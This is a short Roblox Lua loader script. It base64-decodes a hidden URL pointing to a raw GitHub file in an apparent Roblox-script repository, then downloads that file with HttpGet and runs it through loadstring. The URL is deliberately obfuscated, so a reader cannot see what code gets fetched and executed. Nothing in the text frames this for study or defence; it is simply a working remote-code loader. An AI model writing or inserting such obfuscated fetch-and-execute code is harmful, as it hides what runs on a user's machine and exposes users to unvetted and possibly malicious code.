local HS=game:GetService("HttpService")
local u=HS:Base64Decode(
"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3R5eXlneXlnNzc4LW1ha2VyL1JvYmxveC1zY3JpcHQvbWFpbi9yYXlmaWVsZHRvbmdob3AudWxh"
)
loadstring(game:HttpGet(u))()
